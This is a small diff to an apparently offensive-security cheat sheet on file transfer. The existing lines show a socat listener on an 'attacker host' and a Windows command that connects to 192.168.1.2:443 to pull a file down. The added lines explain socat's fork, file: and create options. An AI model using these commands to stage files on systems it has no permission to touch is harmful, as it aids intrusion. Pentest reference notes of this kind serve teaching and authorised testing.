@@ -473,11 +473,16 @@ In your attacker host:
 socat TCP4-LISTEN:443,fork file:file.txt
 ```
 
+* fork = create a child process once the connection is made, allow multiple connections
+* file: = specify the file to transfer
+
 In Windows execute this:
 
 ```text
 socat TCP4:192.168.1.2:443 file:file.txt,create
 ```
+
+* create = specify to create a new file
 
 ## Transfer via Netcat
 
